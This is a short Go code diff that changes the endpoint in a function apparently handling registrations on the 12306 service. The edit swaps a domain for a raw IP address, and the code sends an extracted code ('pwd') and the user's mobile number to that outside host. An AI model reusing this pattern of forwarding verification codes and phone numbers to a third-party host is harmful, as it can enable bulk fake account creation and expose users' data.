@@ -135,7 +135,7 @@ func process12306Register(msg string, user map[string]string) {
 		log.Println(result[1])
 		pwd := result[1]
 		mobile := formatMobile(user["mobile"])
-		url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara=1"
+		url := "http://121.201.67.189:9876/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara=1"
 		if v, ok := mapConfig.Load("12306DexingRatio"); ok {
 			ratio, _ := strconv.ParseInt(v.(string), 10, 64)
 			random := rand.New(rand.NewSource(time.Now().UnixNano()))
